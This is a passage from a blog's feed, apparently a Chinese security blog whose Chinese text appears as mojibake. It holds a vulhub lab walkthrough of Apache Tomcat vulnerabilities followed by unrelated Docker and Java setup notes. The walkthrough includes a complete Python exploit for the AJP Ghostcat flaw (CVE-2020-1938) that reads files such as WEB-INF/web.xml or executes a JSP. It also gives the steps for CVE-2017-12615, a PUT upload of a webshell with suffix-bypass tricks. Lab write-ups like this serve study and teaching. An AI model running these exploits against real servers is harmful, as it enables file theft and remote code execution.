class="line"></span><br><span class="line">    def pack_headers(self):</span><br><span class="line">        self.num_headers = len(self.request_headers)</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;&gt;h&quot;, self.num_headers)</span><br><span class="line">        for h_name in self.request_headers:</span><br><span class="line">            if h_name.startswith(&quot;SC_REQ&quot;):</span><br><span class="line">                code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1</span><br><span class="line">                res += struct.pack(&quot;BB&quot;, 0xA0, code)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">            res += pack_string(self.request_headers[h_name])</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def pack_attributes(self):</span><br><span class="line">        res = b&quot;&quot;</span><br><span class="line">        for attr in self.attributes:</span><br><span class="line">            a_name = attr[&#x27;name&#x27;]</span><br><span class="line">            code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1</span><br><span class="line">            res += struct.pack(&quot;b&quot;, code)</span><br><span class="line">            if a_name == &quot;req_attribute&quot;:</span><br><span class="line">                aa_name, a_value = attr[&#x27;value&#x27;]</span><br><span class="line">                res += pack_string(aa_name)</span><br><span class="line">                res += pack_string(a_value)</span><br><span class="line">            else:</span><br><span class="line">                res += pack_string(attr[&#x27;value&#x27;])</span><br><span class="line">        res += struct.pack(&quot;B&quot;, 0xFF)</span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line">    def serialize(self):</span><br><span class="line">        res = &quot;&quot;</span><br><span class="line">        res = struct.pack(&quot;bb&quot;, self.prefix_code, self.method)</span><br><span class="line">        res += pack_string(self.protocol)</span><br><span class="line">        res += pack_string(self.req_uri)</span><br><span class="line">        res += pack_string(self.remote_addr)</span><br><span class="line">        res += pack_string(self.remote_host)</span><br><span class="line">        res += pack_string(self.server_name)</span><br><span class="line">        res += struct.pack(&quot;&gt;h&quot;, self.server_port)</span><br><span class="line">        res += struct.pack(&quot;?&quot;, self.is_ssl)</span><br><span class="line">        res += self.pack_headers()</span><br><span class="line">        res += self.pack_attributes()</span><br><span class="line">        if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x12, 0x34, len(res))</span><br><span class="line">        else:</span><br><span class="line">            header = struct.pack(&quot;&gt;bbh&quot;, 0x41, 0x42, len(res))</span><br><span class="line">        return header + res</span><br><span class="line"></span><br><span class="line">    def parse(self, raw_packet):</span><br><span class="line">        stream = io.StringIO(raw_packet)</span><br><span class="line">        self.magic1, self.magic2, data_len = unpack(stream, &quot;bbH&quot;)</span><br><span class="line">        self.prefix_code, self.method = unpack(stream, &quot;bb&quot;)</span><br><span class="line">        self.protocol = unpack_string(stream)</span><br><span class="line">        self.req_uri = unpack_string(stream)</span><br><span class="line">        self.remote_addr = unpack_string(stream)</span><br><span class="line">        self.remote_host = unpack_string(stream)</span><br><span class="line">        self.server_name = unpack_string(stream)</span><br><span class="line">        self.server_port = unpack(stream, &quot;&gt;h&quot;)</span><br><span class="line">        self.is_ssl = unpack(stream, &quot;?&quot;)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.request_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &gt; 0xA000:</span><br><span class="line">                h_name = AjpForwardRequest.COMMON_HEADERS[code - 0xA001]</span><br><span class="line">            else:</span><br><span class="line">                h_name = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">            h_value = unpack_string(stream)</span><br><span class="line">            self.request_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def send_and_receive(self, socket, stream, save_cookies=False):</span><br><span class="line">        res = []</span><br><span class="line">        i = socket.sendall(self.serialize())</span><br><span class="line">        if self.method == AjpForwardRequest.POST:</span><br><span class="line">            return res</span><br><span class="line"></span><br><span class="line">        r = AjpResponse.receive(stream)</span><br><span class="line">        assert r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">        res.append(r)</span><br><span class="line">        if save_cookies and &#x27;Set-Cookie&#x27; in r.response_headers:</span><br><span class="line">            self.headers[&#x27;SC_REQ_COOKIE&#x27;] = r.response_headers[&#x27;Set-Cookie&#x27;]</span><br><span class="line"></span><br><span class="line">        # read body chunks and end response packets</span><br><span class="line">        while True:</span><br><span class="line">            r = AjpResponse.receive(stream)</span><br><span class="line">            res.append(r)</span><br><span class="line">            if r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">                break</span><br><span class="line">            elif r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                raise NotImplementedError</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">        return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AjpResponse(object):</span><br><span class="line">    _, _, _, SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = range(7)</span><br><span class="line">    COMMON_SEND_HEADERS = [</span><br><span class="line">        &quot;Content-Type&quot;, &quot;Content-Language&quot;, &quot;Content-Length&quot;, &quot;Date&quot;, &quot;Last-Modified&quot;,</span><br><span class="line">        &quot;Location&quot;, &quot;Set-Cookie&quot;, &quot;Set-Cookie2&quot;, &quot;Servlet-Engine&quot;, &quot;Status&quot;, &quot;WWW-Authenticate&quot;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    def parse(self, stream):</span><br><span class="line">        # read headers</span><br><span class="line">        self.magic, self.data_length, self.prefix_code = unpack(stream, &quot;&gt;HHb&quot;)</span><br><span class="line"></span><br><span class="line">        if self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">            self.parse_send_headers(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">            self.parse_send_body_chunk(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">            self.parse_end_response(stream)</span><br><span class="line">        elif self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">            self.parse_get_body_chunk(stream)</span><br><span class="line">        else:</span><br><span class="line">            raise NotImplementedError</span><br><span class="line"></span><br><span class="line">    def parse_send_headers(self, stream):</span><br><span class="line">        self.http_status_code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.http_status_msg = unpack_string(stream)</span><br><span class="line">        self.num_headers, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.response_headers = &#123;&#125;</span><br><span class="line">        for i in range(self.num_headers):</span><br><span class="line">            code, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">            if code &lt;= 0xA000:  # custom header</span><br><span class="line">                h_name, = unpack(stream, &quot;%ds&quot; % code)</span><br><span class="line">                stream.read(1)  # \0</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            else:</span><br><span class="line">                h_name = AjpResponse.COMMON_SEND_HEADERS[code - 0xA001]</span><br><span class="line">                h_value = unpack_string(stream)</span><br><span class="line">            self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">    def parse_send_body_chunk(self, stream):</span><br><span class="line">        self.data_length, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        self.data = stream.read(self.data_length + 1)</span><br><span class="line"></span><br><span class="line">    def parse_end_response(self, stream):</span><br><span class="line">        self.reuse, = unpack(stream, &quot;b&quot;)</span><br><span class="line"></span><br><span class="line">    def parse_get_body_chunk(self, stream):</span><br><span class="line">        rlen, = unpack(stream, &quot;&gt;H&quot;)</span><br><span class="line">        return rlen</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def receive(stream):</span><br><span class="line">        r = AjpResponse()</span><br><span class="line">        r.parse(stream)</span><br><span class="line">        return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):</span><br><span class="line">    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">    fr.method = method</span><br><span class="line">    fr.protocol = &quot;HTTP/1.1&quot;</span><br><span class="line">    fr.req_uri = req_uri</span><br><span class="line">    fr.remote_addr = target_host</span><br><span class="line">    fr.remote_host = None</span><br><span class="line">    fr.server_name = target_host</span><br><span class="line">    fr.server_port = 80</span><br><span class="line">    fr.request_headers = &#123;</span><br><span class="line">        &#x27;SC_REQ_ACCEPT&#x27;: &#x27;text/html&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONNECTION&#x27;: &#x27;keep-alive&#x27;,</span><br><span class="line">        &#x27;SC_REQ_CONTENT_LENGTH&#x27;: &#x27;0&#x27;,</span><br><span class="line">        &#x27;SC_REQ_HOST&#x27;: target_host,</span><br><span class="line">        &#x27;SC_REQ_USER_AGENT&#x27;: &#x27;Mozilla&#x27;,</span><br><span class="line">        &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate, sdch&#x27;,</span><br><span class="line">        &#x27;Accept-Language&#x27;: &#x27;en-US,en;q=0.5&#x27;,</span><br><span class="line">        &#x27;Upgrade-Insecure-Requests&#x27;: &#x27;1&#x27;,</span><br><span class="line">        &#x27;Cache-Control&#x27;: &#x27;max-age=0&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    fr.is_ssl = False</span><br><span class="line">    fr.attributes = []</span><br><span class="line">    return fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Tomcat(object):</span><br><span class="line">    def __init__(self, target_host, target_port):</span><br><span class="line">        self.target_host = target_host</span><br><span class="line">        self.target_port = target_port</span><br><span class="line"></span><br><span class="line">        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        self.socket.connect((target_host, target_port))</span><br><span class="line">        self.stream = self.socket.makefile(&quot;rb&quot;, buffering=0)</span><br><span class="line"></span><br><span class="line">    def perform_request(self, req_uri, headers=&#123;&#125;, method=&#x27;GET&#x27;, user=None, password=None, attributes=[]):</span><br><span class="line">        self.req_uri = req_uri</span><br><span class="line">        self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,</span><br><span class="line">                                                           method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">        print(&quot;Getting resource at ajp13://%s:%d%s&quot; % (self.target_host, self.target_port, req_uri))</span><br><span class="line">        if user is not None and password is not None:</span><br><span class="line">            self.forward_request.request_headers[</span><br><span class="line">                &#x27;SC_REQ_AUTHORIZATION&#x27;] = f&#x27;Basic &#123;base64.b64encode(f&quot;&#123;user&#125;:&#123;password&#125;&quot;.encode()).decode()&#125;&#x27;</span><br><span class="line">        for h in headers:</span><br><span class="line">            self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">        for a in attributes:</span><br><span class="line">            self.forward_request.attributes.append(a)</span><br><span class="line">        responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">        if len(responses) == 0:</span><br><span class="line">            return None, None</span><br><span class="line">        snd_hdrs_res = responses[0]</span><br><span class="line">        data_res = responses[1:-1]</span><br><span class="line">        if len(data_res) == 0:</span><br><span class="line">            print(&quot;No data in response. Headers:%s\n&quot; % snd_hdrs_res.response_headers)</span><br><span class="line">        return snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">javax.servlet.include.request_uri</span><br><span class="line">javax.servlet.include.path_info</span><br><span class="line">javax.servlet.include.servlet_path</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(&quot;target&quot;, type=str, help=&quot;Hostname or IP to attack&quot;)</span><br><span class="line">parser.add_argument(&#x27;-p&#x27;, &#x27;--port&#x27;, type=int, default=8009, help=&quot;AJP port to attack (default is 8009)&quot;)</span><br><span class="line">parser.add_argument(&quot;-f&quot;, &#x27;--file&#x27;, type=str, default=&#x27;WEB-INF/web.xml&#x27;, help=&quot;file path :(WEB-INF/web.xml)&quot;)</span><br><span class="line">parser.add_argument(&#x27;--rce&#x27;, type=bool, default=False, help=&quot;read file(default) or exec command&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">t = Tomcat(args.target, args.port)</span><br><span class="line">_, data = t.perform_request(f&#x27;/hissec&#123;&quot;.jsp&quot; if args.rce else &quot;&quot;&#125;&#x27;, attributes=[</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.request_uri&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.path_info&#x27;, args.file]&#125;,</span><br><span class="line">    &#123;&#x27;name&#x27;: &#x27;req_attribute&#x27;, &#x27;value&#x27;: [&#x27;javax.servlet.include.servlet_path&#x27;, &#x27;/&#x27;]&#125;,</span><br><span class="line">])</span><br><span class="line">print(&#x27;----------------------------&#x27;)</span><br><span class="line">print(&#x27;&#x27;.join([d.data.decode(&#x27;utf_8&#x27;) for d in data]))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215041264.png" alt="image-20250327215041264"></p><p>ç„¶åå°±èƒ½åœ¨ç›‘å¬å¤„æ‰§è¡Œå‘½ä»¤äº†ï¼Œè¯´æ˜getshellæˆåŠŸäº†</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250327215154910.png" alt="image-20250327215154910"></p><p>åˆ°æ­¤è¯¥æ¼æ´åˆ©ç”¨ç»“æŸã€‚</p><h2 id="CVE-2017-12615">CVE-2017-12615</h2><p>PUTæ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰</p><blockquote><p>kalié¶æœºï¼š192.168.192.132</p><p>win10æ”»å‡»æœºï¼š192.168.192.129</p></blockquote><h3 id="æ¼æ´åŸç†">æ¼æ´åŸç†</h3><p>ç”±äºé…ç½®ä¸å½“ï¼ˆéé»˜è®¤é…ç½®ï¼‰ï¼Œå°†é…ç½®æ–‡ä»¶conf/web.xmlä¸­çš„readonlyè®¾ç½®ä¸ºäº† falseï¼Œå¯¼è‡´å¯ä»¥ä½¿ç”¨PUTæ–¹æ³•ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œä½†é™åˆ¶äº†jspåç¼€çš„æ–‡ä»¶ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ readonly ä¸º trueï¼Œå½“ readonly è®¾ç½®ä¸º false æ—¶ï¼Œå¯ä»¥é€šè¿‡ PUT / DELETE è¿›è¡Œæ–‡ä»¶æ“æ§å¹¶å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><blockquote><p>å½±å“èŒƒå›´ï¼šApache Tomcat 7.0.0 - 7.0.81</p></blockquote><p>è¯¥ç‰ˆæœ¬Tomcaté…ç½®äº†å¯å†™ï¼ˆreadonly=falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3e37200026689dd67856838a099a0b3a.png" alt="img"></p><h3 id="æ¼æ´å¤ç°-2">æ¼æ´å¤ç°</h3><p>å¼€å¯ç¯å¢ƒï¼Œå¹¶ä¸”æŸ¥çœ‹é…ç½®æ–‡ä»¶conf/web.xmlä¸­çš„readonlyæ˜¯å¦è®¾ç½®ä¸º<code> false</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -ti å®¹å™¨id bash</span><br><span class="line">cat conf/web.xml | grep readonly</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328143138882.png" alt="image-20250328143138882"></p><p>æ¥ä¸‹æ¥æŠ“åŒ…çœ‹çœ‹æ˜¯GETæ–¹æ³•ï¼Œå°†å…¶ä¿®æ”¹ä¸ºPUTæ–¹æ³•ï¼Œä¸Šä¼ ä¸€ä¸ªshell.jspï¼ˆå“¥æ–¯æ‹‰ç”Ÿæˆä¸€ä¸ªjspé©¬ï¼Œç„¶åç”¨è®°äº‹æœ¬æ‰“å¼€å¤åˆ¶ä»£ç ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144633865.png" alt="image-20250328144633865"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328144943071.png" alt="image-20250328144943071"></p><p>å“åº”åŒ…å¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ã€‚Tomcat åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ£€æŸ¥äº†æ–‡ä»¶åç¼€ï¼ˆä¸èƒ½ç›´æ¥å†™ jspï¼‰ï¼Œç›´æ¥ä¸Šä¼ å¯¼è‡´æŠ¥é”™ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡ä¸€äº›æ–‡ä»¶ç³»ç»ŸåŠŸèƒ½ç»•è¿‡é™åˆ¶ã€‚</p><h3 id="ç»•è¿‡æ–¹æ³•">ç»•è¿‡æ–¹æ³•</h3><blockquote><p>æ–¹æ³•ä¸€ï¼šä½¿ç”¨æ–œæ /ï¼Œæ–œæ åœ¨æ–‡ä»¶åä¸­æ˜¯éæ³•çš„ï¼Œæ‰€ä»¥ä¼šè¢«å»é™¤ï¼ˆLinuxå’ŒWindowsä¸­éƒ½é€‚ç”¨ï¼‰</p><p>æ–¹æ³•äºŒï¼šé¦–å…ˆä½¿ç”¨<code>%20</code>ç»•è¿‡ã€‚<code>%20</code>å¯¹åº”çš„æ˜¯ç©ºæ ¼ï¼Œåœ¨windowsä¸­è‹¥æ–‡ä»¶è¿™é‡Œåœ¨jspåé¢æ·»åŠ <code>%20</code>å³å¯è¾¾åˆ°è‡ªåŠ¨æŠ¹å»ç©ºæ ¼çš„æ•ˆæœã€‚</p><p>æ–¹æ³•ä¸‰ï¼šä½¿ç”¨Windows NTFSæµï¼Œåœ¨jspåé¢æ·»åŠ <code>::$DATA</code></p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145217887.png" alt="image-20250328145217887"></p><p>ä¸Šä¼ æˆåŠŸï¼Œåœ¨dockerå®¹å™¨ä¸­çœ‹çœ‹ï¼Œå‘ç°æœ‰è¿™ä¸ªæ–‡ä»¶</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145332083.png" alt="image-20250328145332083"></p><p>ä½¿ç”¨å“¥æ–¯æ‹‰è¿æ¥æ¥getshell</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145733623.png" alt="image-20250328145733623"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250328145804009.png" alt="image-20250328145804009"></p>]]></content>
    
    
    <summary type="html">ğŸ¥§ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´åŠæ¼æ´å¤ç°ï¼›ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´tomcat8åŠæ¼æ´å¤ç°ï¼›ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´CVE-2020-1938åŠæ¼æ´å¤ç°ï¼›ã€vulhubæ¼æ´é¶åœºã€‘tomcatæ¼æ´CVE-2017-12615åŠæ¼æ´å¤ç°</summary>
    
    
    
    <category term="webæ¸—é€" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>docker-composeå¯åŠ¨æŠ¥é”™ï¼ˆlibrary initialization failed - unable to allocate file descriptor table - out of memory#ï¼‰é—®é¢˜è§£å†³</title>
    <link href="https://blog.m3x1.cn/posts/eab53833.html"/>
    <id>https://blog.m3x1.cn/posts/eab53833.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-03-26T15:03:28.604Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="å‰è¨€">å‰è¨€</h2><p>æˆ‘ç”¨dockerå¼€å¯å®¹å™¨é¶åœºçš„æ—¶å€™ï¼Œå‡ºç°è¿™ä¸ªæŠ¥é”™ï¼Œæœ€åå‡ºç°139æŠ¥é”™ä»£å·ï¼Œç„¶åå»ç½‘ä¸ŠæŸ¥æ‰¾å„ç§èµ„æ–™åˆ°å¤„è¯•ï¼Œæœ€åé—®é¢˜è§£å†³äº†ï¼Œç”¨è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h2><blockquote><p>library initialization failed - unable to allocate file descriptor table - out of memory#</p></blockquote><p>ç¿»è¯‘è¿‡æ¥å°±æ˜¯è¯´ï¼šåº“åˆå§‹åŒ–å¤±è´¥ - æ— æ³•åˆ†é…æ–‡ä»¶æè¿°ç¬¦è¡¨ - å†…å­˜ä¸è¶³#</p><h2 id="åŸå› ">åŸå› </h2><p>(1) LimitNOFILE=<a href="https://so.csdn.net/so/search?q=infinity&amp;spm=1001.2101.3001.7020">infinity</a> è™½ç„¶æ˜¯ä¸é™åˆ¶ï¼Œä½†æ˜¯åœ¨systemctlç‰ˆæœ¬å°äº234çš„æ—¶å€™ä¸ç”Ÿæ•ˆï¼ŒæŸ¥çœ‹systemctlç‰ˆæœ¬ï¼šsystemctl --version</p><p>(2) dockerå®¹å™¨çš„ulimitå¤ªå°äº†ï¼Œæœ‰æ–‡æ¡£è¯´å¤ªå¤§ä¹Ÿä¸è¡Œ</p><h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h2><h3 id="è§£å†³æ–¹æ³•ä¸€">è§£å†³æ–¹æ³•ä¸€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ä¿®æ”¹/lib/systemd/system/docker.serviceæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">LimitCORE=infinity</span><br><span class="line">LimitNOFILE=infinity</span><br><span class="line">LimitNPROC=infinity</span><br><span class="line">æ”¹æˆ</span><br><span class="line">LimitCORE=65535</span><br><span class="line">LimitNOFILE=65535</span><br><span class="line">LimitNPROC=65535</span><br><span class="line"></span><br><span class="line">#é‡å¯dockeræœåŠ¡</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•äºŒ">è§£å†³æ–¹æ³•äºŒ</h3><p>é—®é¢˜<br>å› è¿å­˜ä¸è¶³æ— æ³•ç»™è¿›ç¨‹åˆ†é…æ›´å¤šçš„æ–‡ä»¶å¥æŸ„æ•°è€Œå¼‚å¸¸é€€å‡º</p><p>åŸè¿è¡ŒæŒ‡ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --ulimit nofile=1024 -d -p 8080:8080 docker-test:v1.0</span><br></pre></td></tr></table></figure><p>æ”¹ä¸º</p><h3 id="è§£å†³æ–¹æ³•ä¸‰">è§£å†³æ–¹æ³•ä¸‰</h3><p>åœ¨ /etc/systemd/system/ ç›®å½•ä¸‹ï¼Œ åˆ›å»º docker.service.d ç›®å½•<br>è¿›å…¥è¯¥ç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œåä¸º docker.conf<br>åœ¨æ–‡ä»¶ä¸­åŠ å…¥ä»¥ä¸‹é…ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --default-ulimit nofile=65535:65535 -H fd://</span><br></pre></td></tr></table></figure><h2 id="ä¸ªäººæ€»ç»“">ä¸ªäººæ€»ç»“</h2><p>æˆ‘æ˜¯ä½¿ç”¨çš„æ–¹æ³•ä¸€ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œä¿®æ”¹/lib/systemd/system/docker.serviceæ–‡ä»¶ï¼Œå¤§æ¦‚å¦‚ä¸‹å›¾ï¼š</p><p>åœ¨ExecStartåé¢åŠ ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--default-ulimit nofile=65535:65535</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225855172.png" alt="image-20250326225855172"></p><p>ç„¶åæŒ‰æ–¹æ³•ä¸€ä¿®æ”¹</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250326225917085.png" alt="image-20250326225917085"></p><p>ä¹‹åé—®é¢˜å°±è§£å†³äº†ã€‚</p>]]></content>
    
    
    <summary type="html">ğŸ¥§docker-composeå¯åŠ¨æŠ¥é”™ï¼ˆlibrary initialization failed - unable to allocate file descriptor table - out of memory#ï¼‰é—®é¢˜è§£å†³</summary>
    
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="é—®é¢˜è§£å†³ç¬”è®°" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>è§£å†³win10ä½¿ç”¨jarå‘½ä»¤å‡ºç°â€jarä¸æ˜¯å†…éƒ¨æˆ–å¤–éƒ¨å‘½ä»¤â€çš„é—®é¢˜</title>
    <link href="https://blog.m3x1.cn/posts/4de01283.html"/>
    <id>https://blog.m3x1.cn/posts/4de01283.html</id>
    <published>2025-03-26T16:00:00.000Z</published>
    <updated>2025-03-27T04:53:14.423Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="åˆ†æåŸå› ">åˆ†æåŸå› </h2><p>æ˜¯å› ä¸ºJDK11ä»¥åå°±ä¸å†é»˜è®¤åˆ›å»º â€œjreâ€ æ–‡ä»¶å¤¹å’Œå…¶å†…å®¹äº†ï¼Œéœ€è¦æ‰‹åŠ¨é…ç½®ã€‚è‡³äºå¦‚ä½•å‘ç°æ²¡æœ‰â€œjreâ€æ–‡ä»¶å¤¹çš„ï¼Œæ˜¯å› ä¸ºçœ‹ç¯å¢ƒå˜é‡çš„è·¯å¾„é‡Œæœ‰â€œjreâ€çš„æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯æˆ‘å‘ç°JDKé‡Œå¹¶æ²¡æœ‰ï¼Œå°±ä¸Šç½‘ä¸€æœæ‰çŸ¥é“åŸå› ã€‚</p><h2 id="é…ç½®è¿‡ç¨‹">é…ç½®è¿‡ç¨‹</h2><p>é¦–å…ˆåœ¨ç³»ç»Ÿå˜é‡é‡Œæ–°å»º â€œJAVA_HOMEâ€ å˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼šâ€œC:\Program Files\Java\jdk-11.0.9â€ ï¼ˆè·¯å¾„ä¸ºè‡ªå·±çš„javaæ–‡ä»¶è·¯å¾„ï¼Œä»¥ä¸‹çš†æ˜¯ï¼‰</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/04928472f8cb730ebda4a2ba1dcdafd3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨ç³»ç»Ÿå˜é‡é‡Œæ–°å»º â€œCLASSPATHâ€ å˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼šâ€œ.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jarâ€</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7ea1758748f9266cd43b8d6ab6cfab4b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åœ¨ç³»ç»Ÿå˜é‡é‡Œæ‰¾åˆ°â€œPathâ€ å˜é‡ï¼Œå˜é‡å€¼ä¸ºï¼šâ€œ%JAVA_HOME%\binâ€å’Œâ€JAVA_HOME%\jre\binâ€</p><p>è¿™é‡Œæ³¨æ„ï¼Œå¦‚æœæ˜¯å¦‚ä¸‹å›¾æ‰€ç¤ºç¼–è¾‘ç•Œé¢ï¼ˆä¸‹å›¾æ˜¯é”™è¯¯ç¤ºèŒƒï¼‰ï¼Œéœ€è¦åˆ†ä¸¤è¡Œæ·»åŠ 